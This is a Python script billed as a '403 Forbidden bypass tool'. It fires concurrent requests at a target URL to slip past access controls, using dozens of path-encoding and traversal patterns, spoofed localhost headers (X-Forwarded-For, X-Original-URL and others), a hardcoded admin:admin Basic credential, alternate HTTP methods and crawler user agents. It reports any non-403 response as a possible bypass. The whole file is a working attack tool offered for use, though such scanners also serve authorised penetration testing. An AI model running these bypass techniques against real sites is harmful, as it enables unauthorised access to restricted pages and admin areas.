#!/usr/bin/env python3
import requests
import sys
import json
import re
import concurrent.futures
from urllib.parse import urljoin, urlparse
import urllib3
import argparse
import time
import random
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Default Chrome User-Agent
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Path bypass patterns - RAW patterns to be formatted later with the actual path
PATH_BYPASS_PATTERNS = [
    # Standard techniques
    "{0}",
    "%2e/{0}",
    "{0}/.",
    "//{0}//",
    "./{0}/./",
    "{0}%20",
    "{0}%09",
    "{0}?",
    "{0}.html",
    "{0}/?anything",
    "{0}#",
    "{0}/*",
    "{0}.php",
    "{0}.json",
    "{0}..;/",
    "{0};/",
    
    # More techniques from the list
    "{0}/?",
    "{0}//",
    "///{0}///",
    "{0}??",
    "{0}/?/",
    "{0}/??",
    "{0}/??/",
    "{0}/..",
    "{0}/../",
    "{0}/./",
    "{0}/.",
    "{0}/.//",
    "{0}/*",
    "{0}//*",
    "{0}/%2f",
    "{0}/%2f/",
    "{0}/%20",
    "{0}/%20/",
    "{0}/%09",
    "{0}/%09/",
    "{0}/%0a",
    "{0}/%0a/",
    "{0}/%0d",
    "{0}/%0d/",
    "{0}/%25",
    "{0}/%25/",
    "{0}/%23",
    "{0}/%23/",
    "{0}/%26",
    "{0}/%3f",
    "{0}/%3f/",
    "{0}/%26/",
    "{0}/#",
    "{0}/#/",
    "{0}/#/./",
    "./{0}",
    "./{0}/",
    "..;/{0}",
    "..;/{0}/",
    ".;/{0}",
    ".;/{0}/",
    ";/{0}",
    ";/{0}/",
    "/;//{0}",
    "/;//{0}/",
    "%2f{0}",
    "../{0}",
    "/%2e/{0}",
    "/..;/{0}",
    "/{0}/..",
    "/./{0}/.",
    "/{0}/.;/",
    "{0}/.json",
    "{0}%00",
    "{0}.css",
    "{0}?id=1",
    "{0}~",
    "{0}/~",
    "{0}/°/",
    "{0}/&",
    "{0}/-",
    "{0}\\/\\/",
    "{0}/..%3B/",
    "{0}/;%2f..%2f..%2f",
]

# Header bypass techniques
HEADER_BYPASS = {
    "X-Original-URL": "{0}",
    "X-Rewrite-URL": "{0}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "Forwarded": "for=127.0.0.1",
    "Referer": "{base_url}",
    "X-Api-Version": "1",
    "Content-Length": "0",
    "Authorization": "Basic YWRtaW46YWRtaW4="
}

# HTTP methods to test
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT", "HEAD", "PROPFIND"]

# User agents to test
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 compatible Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.0",
    "facebookexternalhit/1.1"
]

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='403 Bypass Tool - Test various techniques to bypass 403 Forbidden responses')
    parser.add_argument('url', help='Target URL (e.g., http://example.com/admin)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display detailed output')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    parser.add_argument('--no-wayback', action='store_true', help='Skip Wayback Machine check')
    parser.add_argument('--user-agents', action='store_true', help='Test different user agents')
    parser.add_argument('--methods', action='store_true', help='Test different HTTP methods')
    
    return parser.parse_args()

def request_url(base_url, path, headers=None, method="GET", timeout=5, verbose=False):
    """Make an HTTP request while ignoring SSL errors, with timeout."""
    url = urljoin(base_url, path)
    try:
        response = requests.request(
            method, 
            url, 
            headers=headers or DEFAULT_HEADERS, 
            verify=False, 
            allow_redirects=True, 
            timeout=timeout
        )
        
        if verbose:
            print(f"Request: {method} {url}")
            print(f"Headers: {headers}")
            print(f"Response: {response.status_code}")
        
        return response.status_code, len(response.content)
    except requests.RequestException as e:
        return None, f"Error: {str(e)}"

def extract_base_and_path(url):
    """Split URL into base and path."""
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    path = parsed_url.path.lstrip('/')
    
    # Handle case where only domain is provided
    if not path:
        path = ""
    
    return base_url, path

def print_result(test_identifier, status_code, size, base_url, test_path="", pattern="", use_color=True, response_sizes=None):
    """Display formatted results highlighting responses different from 403."""
    url = f"{base_url}/{test_path}" if test_path else base_url
    
    # Skip 403 responses entirely
    if status_code == 403:
        return status_code, size, url
    
    # Track response sizes to detect potential false positives
    if response_sizes is not None and status_code == 200:
        if size in response_sizes:
            response_sizes[size] += 1
        else:
            response_sizes[size] = 1
        
        # If we've seen this exact response size more than 3 times, 
        # it's likely a false positive (e.g., generic redirect page)
        if response_sizes[size] > 3:
            return status_code, size, url
    
    if use_color:
        if status_code == 403:
            color = Fore.RED
            status_text = f"{Fore.RED}403 FORBIDDEN{Style.RESET_ALL}"
        elif status_code == 200:
            color = Fore.GREEN
            status_text = f"{Fore.GREEN}200 OK{Style.RESET_ALL}"
        elif status_code == 301 or status_code == 302:
            color = Fore.MAGENTA
            status_text = f"{Fore.MAGENTA}{status_code} REDIRECT{Style.RESET_ALL}"
        elif status_code == 404:
            color = Fore.YELLOW
            status_text = f"{Fore.YELLOW}404 NOT FOUND{Style.RESET_ALL}"
        elif status_code is None:
            color = Fore.YELLOW
            status_text = f"{Fore.YELLOW}CONNECTION ERROR{Style.RESET_ALL}"
        else:
            color = Fore.CYAN
            status_text = f"{Fore.CYAN}{status_code}{Style.RESET_ALL}"
            
        # Show successful attempts (non-403) more prominently
        if status_code != 403 and status_code is not None:
            print(f"\n{color}[+] POSSIBLE BYPASS FOUND:{Style.RESET_ALL}")
            print(f"    URL: {color}{url}{Style.RESET_ALL}")
            print(f"    Status: {status_text}")
            print(f"    Size: {size} bytes")
            print(f"    Technique: {pattern if pattern else test_identifier}")
        else:
            # Don't print 403 responses at all
            pass
    else:
        if status_code != 403:  # Don't print 403 responses
            print(f"{url} --> {status_code}, {size} bytes")
    
    return status_code, size, url

def check_wayback(base_url, path, use_color=True):
    """Query Wayback Machine to check if URL has been archived."""
    print("\n" + ("=" * 80))
    print("Checking Wayback Machine archives...")
    wayback_url = f"https://archive.org/wayback/available?url={base_url}/{path}"
    
    try:
        wayback_response = requests.get(wayback_url, timeout=5).json()
        snapshot = wayback_response.get("archived_snapshots", {}).get("closest", {})
        
        if snapshot:
            if use_color:
                print(f"{Fore.BLUE}[Wayback Machine] Archive found:{Style.RESET_ALL}")
                print(f"{Fore.BLUE}{json.dumps(snapshot, indent=2)}{Style.RESET_ALL}")
            else:
                print("[Wayback Machine] Archive found:")
                print(json.dumps(snapshot, indent=2))
        else:
            if use_color:
                print(f"{Fore.YELLOW}[Wayback Machine] No archives found.{Style.RESET_ALL}")
            else:
                print("[Wayback Machine] No archives found.")
    except Exception as e:
        if use_color:
            print(f"{Fore.RED}Error querying Wayback Machine: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"Error querying Wayback Machine: {str(e)}")

def save_results(results, output_file):
    """Save successful bypass results to a file."""
    try:
        with open(output_file, 'w') as f:
            f.write("403 Bypass Tool - Successful Results\n")
            f.write("=" * 50 + "\n\n")
            
            for result in results:
                status_code, size, url = result
                f.write(f"{url} --> {status_code}, {size} bytes\n")
                
        print(f"\nResults saved to {output_file}")
    except Exception as e:
        print(f"Error saving results: {str(e)}")

def print_banner():
    """Display tool banner."""
    banner = r"""
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃                                                             ┃
    ┃   ██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗██████╗    ┃
    ┃   ██║  ██║██╔═══██╗██╔═══██╗   ██╔══██╗╚██╗ ██╔╝██╔══██╗   ┃
    ┃   ███████║██║██╗██║██║   ██║   ██████╔╝ ╚████╔╝ ██████╔╝   ┃
    ┃   ╚════██║████╔╝██║██║   ██║   ██╔══██╗  ╚██╔╝  ██╔═══╝    ┃
    ┃        ██║╚██████╔╝╚██████╔╝   ██████╔╝   ██║   ██║        ┃
    ┃        ╚═╝ ╚═════╝  ╚═════╝    ╚═════╝    ╚═╝   ╚═╝        ┃
    ┃                                                             ┃
    ┃                  403 FORBIDDEN BYPASS TOOL                  ┃
    ┃                                                             ┃
    ┃              [ Created by Security Researcher ]             ┃
    ┃                      [ Version 2.0 ]                        ┃
    ┃                                                             ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    """
    # Print with a typing effect for a more professional look
    for line in banner.split('\n'):
        print(Fore.CYAN + line + Style.RESET_ALL)
        time.sleep(0.01)  # Short delay to create typing effect

def run_bypass(base_url, path, args):
    """Execute bypass tests in parallel for better performance."""
    print_banner()
    
    # Create a visual separator
    print("\n" + "=" * 80)
    print(f"{Fore.CYAN}[+] Target:{Style.RESET_ALL} {Fore.YELLOW}{base_url}/{path}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Starting bypass tests with {args.threads} threads...{Style.RESET_ALL}")
    print("=" * 80 + "\n")
    
    # Add a small delay for better readability
    time.sleep(0.5)
    
    # Initial request to check the actual response
    print(f"{Fore.CYAN}[*] Performing initial request to check server response...{Style.RESET_ALL}")
    status_code, size = request_url(base_url, path, timeout=args.timeout)
    
    if status_code is None:
        print(f"{Fore.RED}[!] Error connecting to target. Please check the URL and try again.{Style.RESET_ALL}")
        return
        
    # Show initial response with appropriate color
    if status_code == 200:
        status_color = Fore.GREEN
    elif status_code == 403:
        status_color = Fore.RED
    else:
        status_color = Fore.YELLOW
        
    print(f"{Fore.CYAN}[*] Initial response:{Style.RESET_ALL} {status_color}{status_code}{Style.RESET_ALL}, {size} bytes\n")
    
    if status_code != 403:
        print(f"{Fore.YELLOW}[!] Note: Target is not returning 403 Forbidden (got {status_code}). Running tests anyway...{Style.RESET_ALL}\n")
    
    # Track response sizes to detect potential false positives
    response_sizes = {}
    
    # Add another small delay before starting tests
    time.sleep(0.5)
    
    bypass_tests = []
    successful_results = []

    # Create list of path tests
    for pattern in PATH_BYPASS_PATTERNS:
        # Formato o padrão para exibição (trocar {0} por "path")
        display_pattern = pattern.replace("{0}", "path")
        
        # Cria o caminho de teste real
        test_path = pattern.format(path)
        bypass_tests.append(("PATH", test_path, display_pattern))
        
        # Add uppercase version
        upper_path = path.upper()
        if upper_path != path:  # Only if there's a difference
            test_path_upper = pattern.format(upper_path)
            bypass_tests.append(("PATH", test_path_upper, display_pattern + " (uppercase)"))

    # Create list of header tests
    for header, value in HEADER_BYPASS.items():
        headers = DEFAULT_HEADERS.copy()
        display_value = value
        
        if "{0}" in value:
            headers[header] = value.format(path)
            display_value = value.replace("{0}", "path")
        elif "{base_url}" in value:
            headers[header] = value.replace("{base_url}", base_url)
            display_value = value.replace("{base_url}", "base_url")
        else:
            headers[header] = value
            
        bypass_tests.append(("HEADER", path, f"{header}: {display_value}", headers))

    # Test HTTP methods if requested
    if args.methods:
        for method in HTTP_METHODS:
            bypass_tests.append(("METHOD", path, method))

    # Test user agents if requested
    if args.user_agents:
        for user_agent in USER_AGENTS:
            headers = DEFAULT_HEADERS.copy()
            headers["User-Agent"] = user_agent
            bypass_tests.append(("USER_AGENT", path, user_agent, headers))

    # Create thread pool for parallel requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_test = {}

        # Submit path tests
        for bypass_type, test_path, pattern in [t for t in bypass_tests if t[0] == "PATH"]:
            future = executor.submit(
                request_url, base_url, test_path, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, test_path, pattern)

        # Submit header tests
        for bypass_type, path, header, headers in [t for t in bypass_tests if t[0] == "HEADER"]:
            future = executor.submit(
                request_url, base_url, path, headers, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, header)

        # Submit method tests
        for bypass_type, path, method in [t for t in bypass_tests if t[0] == "METHOD"]:
            future = executor.submit(
                request_url, base_url, path, method=method, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, method)

        # Submit user agent tests
        for bypass_type, path, agent, headers in [t for t in bypass_tests if t[0] == "USER_AGENT"]:
            future = executor.submit(
                request_url, base_url, path, headers, timeout=args.timeout, verbose=args.verbose
            )
            future_to_test[future] = (bypass_type, path, "User-Agent: " + agent[:30] + "...")

        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_test):
            bypass_type, *params = future_to_test[future]
            try:
                status_code, size = future.result()
                
                if status_code is not None:
                    if bypass_type == "PATH":
                        test_path, display_pattern = params
                        result = print_result(display_pattern, status_code, size, base_url, test_path, display_pattern, 
                                            use_color=not args.no_color, response_sizes=response_sizes)
                    elif bypass_type in ["HEADER", "USER_AGENT"]:
                        path, identifier = params[0], params[1]
                        result = print_result(f"{identifier}", status_code, size, base_url, path, f"{identifier}", 
                                            use_color=not args.no_color, response_sizes=response_sizes)
                    elif bypass_type == "METHOD":
                        path, method = params
                        result = print_result(f"{method}", status_code, size, base_url, path, f"{method}", 
                                            use_color=not args.no_color, response_sizes=response_sizes)
                    
                    # Save successful bypasses (non-403 responses)
                    if status_code != 403:
                        successful_results.append(result)
            except Exception as exc:
                print(f"Error in {params}: {exc}")

    # Check Wayback Machine if not disabled
    if not args.no_wayback:
        check_wayback(base_url, path, use_color=not args.no_color)
    
    # Add intelligence about potential false positives based on response size patterns
    if response_sizes:
        most_common_size = max(response_sizes.items(), key=lambda x: x[1])
        if most_common_size[1] > 10:  # If we see the same size more than 10 times
            print(f"\n{Fore.YELLOW}[!] Warning: Many responses ({most_common_size[1]}) have the same size ({most_common_size[0]} bytes).{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    This may indicate false positives due to a generic response page.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Consider manually verifying any bypasses with this response size.{Style.RESET_ALL}")
    
    # Display summary 
    print("\n" + ("=" * 80))
    print(f"Summary: {len(successful_results)} successful bypass attempts out of {len(bypass_tests)} tests")
    print("=" * 80)
    
    # Save results if output file specified
    if args.output and successful_results:
        save_results(successful_results, args.output)

if __name__ == "__main__":
    try:
        args = parse_arguments()
        base_url, path = extract_base_and_path(args.url)
        run_bypass(base_url, path, args)
    except KeyboardInterrupt:
        print("\nOperation cancelled by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)
